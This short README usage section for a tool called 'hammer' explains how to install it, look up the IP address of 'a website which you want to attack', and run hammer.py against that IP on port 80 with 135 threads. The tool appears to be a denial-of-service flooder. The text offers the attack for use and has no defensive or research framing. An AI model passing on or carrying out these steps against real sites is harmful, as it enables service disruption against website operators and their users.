## Usage:
```
$ apt update
$ apt upgrade
$ apt install python
$ apt install git
$ apt install dnsutils
$ git clone https://github.com/pubtok/hammer

Hammer need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website

then
$ cd hammer
$ python3 hammer.py -s [ip Address] -p 80 -t 135
example:
$ python3 hammer.py -s 123.45.67.89 -p 80 -t 135
```
